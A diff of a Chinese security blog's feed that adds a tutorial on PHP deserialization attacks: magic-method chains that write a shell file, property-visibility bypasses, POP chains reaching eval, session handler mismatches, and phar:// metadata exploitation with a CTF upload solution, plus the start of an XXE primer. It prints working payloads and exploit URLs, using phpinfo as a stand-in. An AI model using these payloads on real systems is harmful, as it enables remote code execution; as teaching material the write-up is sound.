+<p>O:1:”a”:1:{s:4:”test”;s:18:”<?php phpinfo();?>”;}</p>
+</blockquote>
+<p>当我们传入的时候便触发了<code>_wakeup</code>，将一句话木马传入了<code>shell.php</code>中。</p>
+<ul>
+<li><p><strong>__construct()</strong></p>
+<p>有时候反序列化一个对象时，由它调用的<code>__wakeup()</code>中又去调用了其他的对象，由此我们可以一步步倒推，从尾至头找到漏洞点。</p>
+<blockquote>
+<p>以下示例引用自Cyzcc的博客：<a href="http://cyzcc.vip/2020/04/02/php-unserialize/">http://cyzcc.vip/2020/04/02/php-unserialize/</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class CyzCc&#123;</span><br><span class="line">	function __construct($test)&#123;</span><br><span class="line">		$fp &#x3D; fopen(&quot;shell.php&quot;,&quot;w&quot;) ;</span><br><span class="line">		fwrite($fp,$test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Wc&#123;</span><br><span class="line">	var $test &#x3D; &#39;123&#39;;</span><br><span class="line">	function __wakeup()&#123;</span><br><span class="line">		$obj &#x3D; new CyzCc($this-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class5 &#x3D; $_GET[&#39;test&#39;];</span><br><span class="line">print_r($class5);</span><br><span class="line">echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">$class5_unser &#x3D; unserialize($class5);</span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 <code>_wakeup()</code>函数，从而在<code>new CyzCc</code>会自动调用对象<code>CyzCc</code>中的<code>construct()</code>方法，从而将<code>phpinfo()</code>写入到<code>shell.php</code>中。</p>
+<blockquote>
+<p>O:2:”Wc”:1:{s:4:”test”;s:18:”<?php phpinfo();?>;}</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="绕过访问控制"><a href="#绕过访问控制" class="headerlink" title="绕过访问控制"></a>绕过访问控制</h3><p>访问控制的定义：</p>
+<blockquote>
+<p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p>
+<ul>
+<li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li>
+<li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li>
+<li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li>
+</ul>
+<p>——引自 菜鸟教程 “PHP 面向对象”</p>
+</blockquote>
+<p>当出现了<strong>protected</strong>或<strong>private</strong>时，我们可能会无法访问该属性或方法，这时就需要绕过这些访问控制了。</p>
+<ul>
+<li><p><strong>protected</strong></p>
+<p>用<code>/00*/00</code>（url中为<code>%00*%00</code>）来绕过。</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;类sofun中的proteced file属性绕过</span><br><span class="line">O:5:&quot;sofun&quot;:1:&#123;s:7:&quot;&#x2F;00*&#x2F;00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>private</strong></p>
+<p>用<code>%00</code>来绕过。</p>
+<p>示例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;类sofun中的private file属性绕过</span><br><span class="line">O:5:&quot;sofun&quot;:1:&#123;s:15:&quot;%00sofun%00file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h3 id="同名方法利用"><a href="#同名方法利用" class="headerlink" title="同名方法利用"></a>同名方法利用</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//demo1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $target;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;target = <span class="keyword">new</span> B;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;target-&gt;action();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;action B&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;action A&quot;</span>;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;test&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个例子中，class B和class C有一个同名方法action，我们可以构造目标对象，使得析构函数调用class C的action方法，实现任意代码执行。</p>
+<p>构造代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">	var $target;</span><br><span class="line">	function __construct() &#123;</span><br><span class="line">		$this-&gt;target &#x3D; new C;</span><br><span class="line">		$this-&gt;target-&gt;test &#x3D; &quot;phpinfo();&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	function __destruct() &#123;</span><br><span class="line">		$this-&gt;target-&gt;action();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">class C &#123;</span><br><span class="line">	var $test;</span><br><span class="line">	function action() &#123;</span><br><span class="line">		echo &quot;action C&quot;;</span><br><span class="line">		eval($this-&gt;test);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo serialize(new A);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;<span class="number">0</span>:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;phpinfo();&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">localhost/demo1.php?test=O:1:&quot;A&quot;:1:&#123;s:6:&quot;target&quot;;0:1:&quot;C&quot;:1&#123;s:4:&quot;test&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<hr>
+<h1 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h1><p>pop链，即把魔术方法作为最开始的小组件，然后在魔术方法中调用其他函数(小组件)，通过寻找相同名字的函数，再与类中的敏感函数和属性相关联，就是POP CHAIN 。此时类中所有的敏感属性都属于可控的。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制POP CHAIN达到利用特定漏洞的效果。</p>
+<p>通俗点就是：反序列化中，如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来。</p>
+<p>举个简单的例子：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> normal();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">&#x27;d&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>分析这个上述代码：</p>
+<p>先找魔术方法<code>__destruct()</code>，<code>lemon</code>这个类本来是调用<code>normal</code>类的，但是现在<code>action</code>方法在<code>evil</code>类里面也有，所以可以构造pop链，调用<code>evil</code>类中的<code>action</code>方法。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $ClassObj;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $data = <span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> lemon()));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\r&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>值得注意的是，<code>protected $ClassObj = new evil();</code>是不行的，还是需要通过<code>__construct</code>来实例化。</p>
+<hr>
+<h1 id="Session反序列化漏洞"><a href="#Session反序列化漏洞" class="headerlink" title="Session反序列化漏洞"></a>Session反序列化漏洞</h1><p>PHP中的Session是在经序列化后存储，读取时再进行反序列化的。</p>
+<p>相关配置：</p>
+<table>
+<thead>
+<tr>
+<th>配置</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>session.save_handler=””</td>
+<td>设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数。(数据库等方式)</td>
+</tr>
+<tr>
+<td>session.save_path=””</td>
+<td>设置session的存储路径。</td>
+</tr>
+<tr>
+<td>session.auto_start boolen</td>
+<td>指定会话模块是否在请求开始时启动一个会话。(默认为0不启动)</td>
+</tr>
+<tr>
+<td>session.serialize_handler string</td>
+<td>定义用来序列化/反序列化的处理器名字。(默认使用php)</td>
+</tr>
+</tbody></table>
+<p>PHP中有三种序列化处理器，如下表所示：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/php1/9.jpg"></p>
+<p>然后session序列化后需要储存在服务器上，默认的方式是储存在文件中，储存路径在<code>session.save_path</code>中，如果没有规定储存路径，那么默认会在储存在<code>/tmp</code>中，文件的名称是’sess_’+session名，文件中储存的是序列化后的session。</p>
+<p>示例代码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/php1/10.jpg"></p>
+<p>该内容存储后即为序列化的session：<code>test|s:4:&quot;test&quot;;</code></p>
+<p>不同处理器的格式不同，当不同页面使用了不同的处理器时，由于处理的Session序列化格式不同，就可能产生反序列化漏洞。</p>
+<p>下面演示漏洞利用：</p>
+<p>该页面有类<code>demo3</code>，我们开启session，并用php处理器来处理session。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//demo3.php</span></span><br><span class="line">ini_set(<span class="string">&quot;session.serialize_handle&quot;</span>,<span class="string">&quot;php&quot;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;wakeup!&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过session.php设置session，通过generate.php构造实例。</p>
+<p>由于session.php与demo3.php采用的序列化处理器不同，我们可以构造“误导”处理器，达到漏洞利用的目的。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//session.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;test&#x27;</span>] = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> session_id();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//generate.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo3</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $test  = <span class="string">&quot;w2t3rp2dd13r&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> demo3);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问得到实例的序列化：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:5:&quot;demo3&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;w2t3rp2dd13r&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要在<code>serialize()</code>的结果前加<code>|</code>，当使用php处理器时，就会把<code>|</code>后的内容给反序列化，从而调用<code>demo3.php</code>中的<code>__wakeup()</code>方法和<code>__destruct()</code>方法。</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|O:5:&quot;demo3&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;w2t3rp2dd13r&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.4.0/php1/11.png"></p>
+<p>访问<code>demo3.php</code>成功创建了一个类<code>demo3</code>的实例。</p>
+<hr>
+<h1 id="phar实现php反序列化"><a href="#phar实现php反序列化" class="headerlink" title="phar实现php反序列化"></a>phar实现php反序列化</h1><p>phar（PHp ARchive）的解释是：like a Java JAR，but for PHP.   所以它本身其实是一个打包文件，是伪协议中的一种，和反序列化好像没有什么联系。</p>
+<p>然而在2018年8月，安全研究员 <strong>Sam Thomas</strong> 在   <code>BlackHat2018</code>大会  上分享了议题：<code>It’s a PHP unserialization vulnerability Jim, but not as we know it.</code>     其利用<strong>phar</strong>伪协议会将用户自定义的<strong>meta-data</strong>序列化的形式存储这一特性，扩展了php反序列化的攻击面。</p>
+<p>因此，我们是可以利用phar来实现php的反序列化的。用户自定义的meta-data会以序列化形式存储在phar文件中的manifest部分；当使用phar://协议来解析phar文件时，便会对phar文件中的manifest部分进行反序列化。</p>
+<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><h3 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h3><p>phar由四个部分组成。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.stub</span><br><span class="line">	phar 扩展识别的标志 格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;  只有结尾是__HALT_COMPILER();?&gt;才会被php识别为是一个phar。</span><br><span class="line"></span><br><span class="line">2.manifest</span><br><span class="line">	phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。</span><br><span class="line"></span><br><span class="line">3.contents</span><br><span class="line">	压缩文件的内容</span><br><span class="line"></span><br><span class="line">4.signature</span><br><span class="line">	文件的签名内容</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="phar文件生成"><a href="#phar文件生成" class="headerlink" title="phar文件生成"></a>phar文件生成</h3><p>我们来自己构建一个<code>phar</code>文件，<code>php</code>内置了一个<code>Phar</code>类。<br> <strong>注意：需要将<code>php.ini</code>中的<code>phar.readonly</code>设置成off。</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#eval.class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $val;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$val</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;val = $val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        assert(<span class="keyword">$this</span>-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># phar_gen.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Evil.class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$exception = <span class="keyword">new</span> Evil(<span class="string">&#x27;phpinfo()&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;vul.phar&quot;</span>);		<span class="comment">//定义phar文件的文件名</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();		<span class="comment">// 启动缓冲Phar写操作</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);		<span class="comment">//以字符串的形式添加一个文件到 phar 档案</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);		<span class="comment">//设置存根，即设置a stub的内容</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($exception);			<span class="comment">//设置phar归档元数据</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();			<span class="comment">//停止缓冲对Phar归档文件的写请求，并将更改保存到磁盘</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后我们用二进制编辑器打开生成文件，如下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/3.png"></p>
+<p>可以看到其中的一段序列化文本，就是<code>meta-data</code>序列化的结果。</p>
+<h3 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar://反序列化"></a><code>phar://</code>反序列化</h3><p>那么，如何利用<code>phar://</code>进行反序列化呢？</p>
+<p>使用<code>phra://</code>伪协议读取文件的时候，文件会被解析成phar对象，这个时候，刚才那部分的序列化的信息就会被反序列化。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Evil.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( file_exists($_REQUEST[<span class="string">&#x27;url&#x27;</span>]) ) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;success!&#x27;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;error!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>访问test.php， <code>http://127.0.0.1/test.php?url=phar://vul.phar</code>，得下图：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/4.png"></p>
+<h2 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h2><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，即<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。采用这种方法可以绕过很大一部分上传检测。</p>
+<p>下面这道题目就利用了这个漏洞：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/5.png"></p>
+<p>我们写一个php来建一个phar。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">funny</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$exception = <span class="keyword">new</span> funny();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;flag.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php__HALT_COMPILER(); ?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($exception);<span class="comment">//将自定义的meta-data存入mainfest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php文件系统大部分函数再通过phar://解析时，会对meta-data反序列化，从而达到我们的目的。</p>
+<p>访问该php得到了flag.php。</p>
+<p>进linux对phar进行cat发现是乱码，原来是因为phar是一个data文件。其原因是data会被base64解密一次，只要再data加密就可以cat了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/6.png"></p>
+<p>我们再对其进行urlencode，防止加号被吃，然后就可以上传了。</p>
+<p>我们得到了txt文件，问了大佬才知道只要是phar://协议解析，后缀是什么都无所谓，我之前甚至都没有想过这个问题。。。</p>
+<p>然后我们就拿到flag啦。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/7.png"></p>
+<p>我们得到了txt文件，因为这里的后缀<code>.txt</code>是不会影响反序列化操作的，我们就成功拿到flag啦。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.2.1/php1/8.png"></p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>phar的知识现在已经有很多了，也很值得去深挖，自己还只是会了一点表面，需要更加深入的研究。    </p>
 ]]></content>
       <categories>
         <category>php</category>
@@ -1035,232 +1681,6 @@
 ]]></content>
       <categories>
         <category>sql</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>XXE漏洞总结</title>
-    <url>/2021/01/23/xxe/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文主要总结XML外部实体注入漏洞。文中部分内容直接或间接引用于其他大牛的文章中，我都会标明出处，如有侵权，请发邮箱联系我删除。多有不合理之处，望大佬指点。</p>
-<hr>
-<h1 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h1><p>要想了解XXE漏洞，首先得懂得基础知识，了解XML文档的基本知识。</p>
-<h2 id="XML概述"><a href="#XML概述" class="headerlink" title="XML概述"></a>XML概述</h2><p>XML是一种用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。其类似于HTML，但HTML 旨在显示信息，而 XML 旨在传输信息。<a id="more"></a></p>
-<h2 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h2><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/jiulin23/image@2.3.0/xxe/1.png"></p>
-<h2 id="XML文档的构建模块"><a href="#XML文档的构建模块" class="headerlink" title="XML文档的构建模块"></a>XML文档的构建模块</h2><p>所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：</p>
-<ul>
-<li>元素</li>
-<li>属性</li>
-<li>实体</li>
-<li>PCDATA</li>
-<li>CDATA</li>
-</ul>
-<p>下面是每个构建模块的简要描述。</p>
-<h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p>XML元素是XML以及HTML文档的主要构建模块，指的是从（且包括）开始标签直到（且包括）结束标签的部分。元素可包含文本、其他元素或者是空的。</p>
-<p>实例:</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>body text in between<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>some message in between<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>属性可提供有关元素的额外信息。属性不能包含多个值，且不能包含树结构。</p>
-<p>实例：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">file</span> <span class="attr">type</span>=<span class="string">&quot;gif&quot;</span>&gt;</span>computer.gif<span class="tag">&lt;/<span class="name">file</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p>
-<p>实体引用是对实体的引用。</p>
-<p>实体可在内部或外部进行声明。</p>
-<h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>PCDATA 的意思是被解析的字符数据(parsed character data)。<br>PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。</p>
-<h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>CDATA 的意思是字符数据(character data)。<br>CDATA 是不会被解析器解析的文本。</p>
-<h2 id="DTD-文档类型定义"><a href="#DTD-文档类型定义" class="headerlink" title="DTD(文档类型定义)"></a>DTD(文档类型定义)</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。</p>
-<p>DTD 既可以在 XML 文档内声明，也可以外部引用。</p>
-<ol>
-<li><p>内部声明的语法：&lt;!DOCTYPE 根元素 [元素声明]&gt; 。例如：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>      (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>    (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">  <span 